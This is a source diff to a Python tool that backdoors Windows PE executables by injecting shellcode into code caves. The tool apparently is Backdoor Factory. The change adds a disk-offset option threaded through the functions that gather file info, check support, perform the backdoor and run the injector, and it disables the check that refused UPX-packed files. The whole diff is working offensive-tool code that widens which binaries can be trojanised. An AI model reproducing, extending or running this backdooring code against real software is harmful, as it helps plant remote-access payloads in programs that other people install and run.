@@ -596,7 +596,6 @@ def pe32_entry_instr(TrackingAddress, fileItems):
     #for i, byte in enumerate(initial_instr_set):
     #    print i, ByteToHex(byte)
     f.seek(fileItems['LocOfEntryinCode'])
-    #print hex(fileItems['LocOfEntryinCode'])
     count = 0
     loop_count = 0
     ImpList = []
@@ -906,7 +905,7 @@ def resume_execution_32(ImpList):
     return ReturnTrackingAddress, resumeExe
 
 
-def gather_file_info(filename, backdoorfile):
+def gather_file_info(filename, backdoorfile, LocOfEntryinCode_Offset):
     """
     Gathers necessary PE header information to backdoor
     a file and returns a dict of file information called fileItems
@@ -917,6 +916,7 @@ def gather_file_info(filename, backdoorfile):
     fileItems['filename'] = filename
     fileItems['buffer'] = 0
     fileItems['JMPtoCodeAddress'] = 0
+    fileItems['LocOfEntryinCode_Offset'] = LocOfEntryinCode_Offset
     fileItems['dis_frm_pehdrs_sectble'] = 248
     fileItems['backdoorfile'] = backdoorfile
     fileItems['pe_header_location'] = struct.unpack('<i', f.read(4))[0]
@@ -966,10 +966,7 @@ def gather_file_info(filename, backdoorfile):
         # SectionFlags
         sectionValues.append(struct.unpack('<i', f.read(4))[0])
         fileItems['Sections'].append(sectionValues)
-    for section in fileItems['Sections']:
-        if 'UPX'.lower() in section[0].lower():
-            print "No support for UPX packed files... yet.."
-            return
+
     fileItems['VirtualAddress'] = fileItems['SizeOfImage']
     #SizeOfImage is also the NewSection VirtualAddress
     f.seek(fileItems['pe_header_location'] +
@@ -981,7 +978,9 @@ def gather_file_info(filename, backdoorfile):
     fileItems['textPointerToRawData'] = struct.unpack('<i', f.read(4))[0]
     fileItems['LocOfEntryinCode'] = (fileItems['AddressOfEntryPoint'] -
                                      fileItems['textVirtualAddress'] +
-                                     fileItems['textPointerToRawData'])
+                                     fileItems['textPointerToRawData'] +
+                                     fileItems['LocOfEntryinCode_Offset'])
+
     fileItems['VirtualStartingPoint'] = (fileItems['AddressOfEntryPoint'] +
                                          fileItems['ImageBase'])
     fileItems['OldIATLoc'] = (fileItems['pe_header_location'] +
@@ -1300,13 +1299,14 @@ def find_cave(fileItems, shellcode_length):
 
 
 def do_thebackdoor(filename, backdoorfile, shellcode,
-                   nsection, NewCodeCave=False, encoder="none"):
+                   nsection, LocOfEntryinCode_Offset,
+                   NewCodeCave=False, encoder="none"):
     """
     This function operates the sequence of all involved
     functions to perform the backdoor.
     """
     global fileItems
-    fileItems = support_check(filename, backdoorfile)
+    fileItems = support_check(filename, backdoorfile, LocOfEntryinCode_Offset)
     if fileItems is False:
         return None
     fileItems['NewCodeCave'] = NewCodeCave
@@ -1472,25 +1472,32 @@ def set_shells(SHELL, PORT, HOST=""):
     return shellcode
 
 
-def support_check(filename, backdoorfile):
+def support_check(filename, backdoorfile, LocOfEntryinCode_Offset):
     """
     This function is for checking if the current exe/dll is
     supported by this program. Returns false if not supported,
     returns fileItems if it is.
     """
-    fileItems = gather_file_info(filename, backdoorfile)
+    fileItems = gather_file_info(filename, backdoorfile,
+                                 LocOfEntryinCode_Offset)
     if MachineTypes[hex(fileItems['MachineType'])] not in supported_types:
         for item in fileItems:
             print item+':', fileItems[item]
         print ("This program does not support this format: %s"
                % MachineTypes[hex(fileItems['MachineType'])])
         return False
-    else:
-        return fileItems
+    '''for section in fileItems['Sections']:
+        if 'UPX'.lower() in section[0].lower():
+            print "No support for UPX packed files... yet.."
+            return
+        return False'''
+
+    return fileItems
 
 
 def injector(suffix, change_Access, SHELL, encoder, host,
-             port, nsection, add_section, verbose, delete_original):
+             port, nsection, add_section, verbose, delete_original,
+             LocOfEntryinCode_Offset):
     """
     The injector module will hunt and injection shellcode into
     targets that are in the list_of_targets dict.
@@ -1650,7 +1657,8 @@ def injector(suffix, change_Access, SHELL, encoder, host,
         output_file = output_options(target, target+'.bd')
         print "Backdooring:", target
         result = do_thebackdoor(target, output_file, shellcode,
-                                nsection, add_section, encoder)
+                                nsection, LocOfEntryinCode_Offset,
+                                add_section, encoder)
         if result:
             pass
         else:
@@ -1772,6 +1780,12 @@ if __name__ == "__main__":
                       help="For use with injector module.  This command"
                       " deletes the original file.  Not for use in production "
                       "systems.  *Author not responsible for stupid uses.*")
+    parser.add_option("-O", "--disk_offset", default=0,
+                      dest="DISK_OFFSET", type="int", action="store",
+                      help="Starting point on disk offset, in bytes. "
+                      "Some authors want to obfuscate their on disk offset "
+                      "to avoid reverse engineering, if you find one of those "
+                      "files use this flag, after you find the offset.")
 
     (options, args) = parser.parse_args()
 
@@ -1821,6 +1835,7 @@ if __name__ == "__main__":
                                             output_file,
                                             shellcode,
                                             options.NSECTION,
+                                            options.DISK_OFFSET,
                                             options.ADD_SECTION,
                                             options.ENCODER)
                     if result is None:
@@ -1846,6 +1861,7 @@ if __name__ == "__main__":
                             output_file,
                             shellcode,
                             options.NSECTION,
+                            options.DISK_OFFSET,
                             options.ADD_SECTION,
                             options.ENCODER)
     if result is True:
